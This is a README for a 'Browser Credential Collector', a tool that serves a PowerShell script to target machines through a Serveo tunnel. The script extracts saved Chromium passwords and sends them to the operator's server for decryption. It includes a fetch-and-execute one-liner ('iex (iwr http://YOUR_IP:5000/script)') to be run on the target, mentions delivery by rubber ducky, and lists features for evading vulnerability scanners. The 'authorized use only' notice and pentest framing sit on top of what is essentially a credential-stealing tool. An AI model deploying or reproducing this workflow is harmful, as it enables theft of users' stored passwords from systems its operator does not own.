# Browser Credential Collector

A tool designed to securely collect and decrypt stored browser credentials from remote systems. This tool helps security professionals and system administrators assess password security and demonstrate how easily browser-stored credentials can be retrieved.

1. It will connect to a serveo tunnel allowing it to be accessable via the internet
2. Customizes a unique useragent per user request to ensure it isn't spammed
3. Decrypts the passwords locally

## 🚨 Important Notice

This tool is intended for **AUTHORIZED USE ONLY**. Always obtain proper permissions before using on any system. Unauthorized use against systems you don't own or have explicit permission to test is illegal and unethical. Red team engagements and rubber duckies work awesome with this.

## 🔑 Features

- Securely collects stored browser credentials
- Automatically decrypts passwords using browser encryption keys
- Real-time monitoring dashboard
- Secure token-based authentication
- Protection against scanning and unauthorized access
- Public access via Serveo tunneling (optional)
- Rate limiting to prevent abuse

## 📋 Requirements

- Python 3.6+
- OpenSSH client (for Serveo tunneling)
- PyCryptodome (optional, for better decryption support)

## 💻 Quick Start

1. **Clone the repository**

```bash
git clone https://github.com/pentestfunctions/chromium_passwords_local_collection.git
cd chromium_passwords_local_collection
```

2. **Install optional dependencies**

```bash
pip install pycryptodome
```

3. **Run the server**

```bash
python3 credential_collector.py
```

4. **Execute the PowerShell script on target system**

```powershell
# Run this on the target machine
iex (iwr http://YOUR_IP:5000/script)
```

If you're using Serveo tunneling, the URL will be displayed in the console.

## 📚 How It Works

1. The server runs on your machine and generates unique tokens
2. When a target accesses the `/script` endpoint, they receive a customized PowerShell script with a unique token
3. The PowerShell script extracts stored browser credentials and securely sends them back to the server
4. The server decrypts and stores the credentials
5. All activity is monitored in real-time through the console dashboard

## 🔒 Security Features

- One-time tokens for script authentication
- Rate limiting to prevent abuse
- Scanner detection to block common vulnerability scanners
- IP blocking for suspicious activity
- All credentials stored locally in JSON format

## 📊 Understanding the Dashboard

The dashboard shows:
- Server information (local and public URLs)
- Collection statistics (credentials collected, success rates)
- Recent events
- Tunnel status (if using Serveo)
- List of collected credential files
- Blocked IPs

## ❓ Troubleshooting

**Error: "pycryptodome not found"**
- Install with: `pip install pycryptodome`

**Can't establish Serveo tunnel**
- Make sure SSH is installed and can connect to external services
- Try running with `--no-serveo` to use local network only

**No credentials collected**
- Verify the target system has Chrome/Chromium-based browsers installed
- Check that the PowerShell script is running with sufficient permissions
